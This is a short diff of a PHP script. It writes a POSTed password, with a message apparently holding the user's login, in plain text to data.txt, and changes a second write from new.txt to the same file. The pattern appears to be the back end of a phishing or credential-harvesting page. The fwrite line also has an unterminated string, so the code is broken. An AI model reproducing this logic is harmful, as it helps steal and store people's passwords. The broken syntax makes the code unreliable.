@@ -14,7 +14,7 @@ $password = $_POST['password'];
     $data = fopen("data.txt", "w+");
     fwrite($data, "$message pass: $password);
     fclose($data);
-file_put_contents("new.txt", "$message pass: $password");
+file_put_contents("data.txt", "$message pass: $password");
 }
 ?>
 
